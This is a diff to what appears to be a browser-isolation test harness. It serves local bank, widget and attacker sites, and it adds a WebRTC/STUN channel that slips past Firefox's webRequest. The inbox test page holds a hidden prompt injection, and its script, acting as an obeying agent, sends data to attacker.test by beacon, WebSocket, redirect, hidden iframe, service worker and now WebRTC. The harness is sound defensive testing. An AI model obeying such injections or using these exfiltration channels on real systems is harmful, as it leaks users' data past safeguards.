@@ -5,13 +5,18 @@
 //   others   http://widget.test:<port>          a sign-in widget in a frame
 //            http://news.test:<port>            a site that frames the bank
 //   attacker http://attacker.test:<port>        counts every request and connection
+//            udp://127.0.0.1:<port>             counts every packet (a STUN server for WebRTC)
 // *.localhost is a secure context, so the bank page can start a service worker.
 import { randomBytes } from "node:crypto";
+import { createSocket } from "node:dgram";
 import { createServer } from "node:http";
 
 const html = (res, body, headers = {}) => res.writeHead(200, { "content-type": "text/html; charset=utf-8", ...headers }).end(`<!doctype html><meta charset="utf-8">${body}`);
 const cookies = (req) => Object.fromEntries((req.headers.cookie ?? "").split(/;\s*/).filter(Boolean).map((c) => c.split("=")));
 const listen = (server) => new Promise((done) => server.listen(0, "127.0.0.1", () => done(server.address().port)));
+
+/** Open a WebRTC connection to the UDP listener. Firefox sends STUN packets that webRequest never sees. */
+const webrtc = (ports) => `try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${ports.udp}" }] }); pc.createDataChannel("d"); pc.createOffer().then((o) => pc.setLocalDescription(o)); note("webrtc", "started"); } catch { note("webrtc", "blocked"); }`;
 
 /** The test page with a hidden prompt injection. Its script acts as an agent that obeys the injection. */
 function inbox(user, ports) {
@@ -31,6 +36,7 @@ note("beacon", navigator.sendBeacon(a + "/beacon", d) ? "queued" : "refused");
 try { const ws = new WebSocket(a.replace("http", "ws") + "/ws?d=" + d); ws.onopen = () => note("websocket", "open"); ws.onerror = () => note("websocket", "blocked"); } catch { note("websocket", "blocked"); }
 fetch("/go?to=" + encodeURIComponent(a + "/via-redirect?d=" + d)).then(() => note("redirect", "sent"), () => note("redirect", "blocked"));
 const f = document.createElement("iframe"); f.src = a + "/frame?d=" + d; f.hidden = true; document.body.append(f); note("frame", "started");
+${webrtc(ports)}
 navigator.serviceWorker.register("/sw.js?d=" + d).then(() => note("service worker", "started"), () => note("service worker", "refused"));
 // Tell the bank what happened. The bank is on the allow list, so this request passes.
 setTimeout(() => fetch("/report", { method: "POST", body: JSON.stringify([...document.querySelectorAll("#tries li")].map((li) => li.textContent)) }), 2500);
@@ -38,7 +44,7 @@ setTimeout(() => fetch("/report", { method: "POST", body: JSON.stringify([...doc
 }
 
 export async function startSites() {
-  const log = { attacker: [], attackerConnections: 0, bank: [], reports: [] };
+  const log = { attacker: [], attackerConnections: 0, udpPackets: 0, bank: [], reports: [] };
   const sessions = new Map(); // session -> user. A new login ends the old session of that user.
   const ports = {};
   const bank = createServer((req, res) => {
@@ -68,6 +74,7 @@ export async function startSites() {
       return res.writeHead(200, { "content-type": "text/javascript" }).end(`self.addEventListener("install", () => self.skipWaiting());
 self.addEventListener("activate", (e) => e.waitUntil(clients.claim().then(() => fetch(${JSON.stringify(target)}, { mode: "no-cors" }).catch(() => {}))));`);
     }
+    if (url.pathname === "/webrtc") return html(res, `<h1>WebRTC probe</h1><ul id="tries"></ul><script>const note = (how, result) => document.getElementById("tries").append(Object.assign(document.createElement("li"), { textContent: how + ": " + result }));\n${webrtc(ports)}</script>`);
     if (!user) return html(res, `<title>Bank</title><h1 data-state="out">Not signed in</h1>`);
     if (url.pathname === "/inbox") return html(res, inbox(user, ports));
     return html(res, `<title>Bank</title><style>body{font:16px system-ui;margin:24px}</style><h1 data-state="in">Signed in as ${user}</h1><p>This is your own tab, in your default container.</p>`);
@@ -89,11 +96,14 @@ self.addEventListener("activate", (e) => e.waitUntil(clients.claim().then(() => 
   ports.bank = await listen(bank);
   ports.others = await listen(others);
   ports.attacker = await listen(attacker);
+  const udp = createSocket("udp4");
+  udp.on("message", () => log.udpPackets++);
+  ports.udp = await new Promise((done) => udp.bind(0, "127.0.0.1", () => done(udp.address().port)));
   const servers = [bank, others, attacker];
   return {
     ports,
     log,
     sessions,
-    close: () => Promise.all(servers.map((s) => new Promise((done) => (s.closeAllConnections(), s.close(() => done()))))),
+    close: () => Promise.all([new Promise((done) => udp.close(done)), ...servers.map((s) => new Promise((done) => (s.closeAllConnections(), s.close(() => done()))))]),
   };
 }
